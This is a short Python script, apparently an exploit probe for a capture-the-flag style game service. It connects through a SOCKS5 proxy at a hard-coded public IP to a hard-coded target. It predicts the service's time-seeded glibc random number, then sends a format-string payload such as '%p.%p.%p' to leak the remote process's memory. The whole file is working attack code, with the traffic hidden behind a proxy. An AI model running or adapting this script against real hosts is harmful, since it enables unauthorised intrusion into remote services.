import socket, struct, time, sys, re
sys.path.insert(0, '.')
from rand_glibc import GlibcRand

PROXY = ('192.252.214.17', 4145)
TARGET = ('103.163.47.230', 34396)


def socks5_connect(proxy, target, timeout=12):
    s = socket.create_connection(proxy, timeout=timeout)
    s.settimeout(timeout)
    s.sendall(b'\x05\x01\x00')
    if s.recv(2) != b'\x05\x00':
        raise RuntimeError('socks auth')
    s.sendall(b'\x05\x01\x00\x01' + socket.inet_aton(target[0]) + struct.pack('>H', target[1]))
    r = s.recv(10)
    if len(r) < 2 or r[1] != 0:
        raise RuntimeError('socks connect failed')
    return s


def rand_for(ts):
    return GlibcRand(ts).next()


def probe(fmt, ts_offset=0, wait=2.0):
    s = socks5_connect(PROXY, TARGET)
    buf = b''
    s.settimeout(wait)
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
            if b'\xe8\xae\xa9\xe6\xb8\xb8\xe6\x88\x8f' in buf and buf.count(b'\n') >= 1:
                break
    except socket.timeout:
        pass
    seed = int(time.time()) + ts_offset
    s.sendall(str(rand_for(seed)).encode() + b'\n')
    time.sleep(0.4)
    s.sendall(fmt.encode() + b'\n')
    time.sleep(0.8)
    out = b''
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return buf, out


if __name__ == '__main__':
    fmt = sys.argv[1] if len(sys.argv) > 1 else '%p.%p.%p'
    b, o = probe(fmt)
    print('--- 初始 ---')
    print(b.decode('utf-8', 'replace'))
    print('--- 结果 ---')
    print(o.decode('utf-8', 'replace'))
